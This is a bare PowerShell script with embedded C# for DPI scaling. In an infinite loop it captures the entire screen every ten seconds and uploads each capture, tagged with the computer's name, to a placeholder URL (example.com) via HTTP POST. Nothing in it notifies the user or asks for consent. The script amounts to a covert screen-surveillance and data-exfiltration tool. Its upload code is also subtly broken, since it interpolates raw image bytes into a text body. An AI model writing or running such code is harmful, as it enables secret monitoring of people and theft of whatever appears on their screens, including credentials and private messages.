Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Drawing;

public class DPI {
  [DllImport("gdi32.dll")]
  static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

  public enum DeviceCap {
  VERTRES = 10,
  DESKTOPVERTRES = 117
  }

  public static float scaling() {
  Graphics g = Graphics.FromHwnd(IntPtr.Zero);
  IntPtr desktop = g.GetHdc();
  int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
  int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);

  return (float)PhysicalScreenHeight / (float)LogicalScreenHeight;
  }
}
'@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop

$url = "https://example.com/p"


while ($true) {
    # Add necessary types
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    # Get virtual screen information
    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen

    # Create a bitmap of the virtual screen size
    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)

    # Save bitmap to a memory stream in PNG format
    $m = New-Object System.IO.MemoryStream
    $b.Save($m, [System.Drawing.Imaging.ImageFormat]::Png)
    $f = $m.ToArray()

    # Set up the multipart form-data
    $boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: image/png

$f
--$boundary--
"@
    # Convert the body to byte array
    $bB = [System.Text.Encoding]::UTF8.GetBytes($body)

    # Set the headers
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    # Send the HTTP request
    Invoke-WebRequest -Uri $url -Method Post -Headers $headers -Body $bB

    # Wait for 10 seconds before the next iteration
    Start-Sleep -Seconds 10
}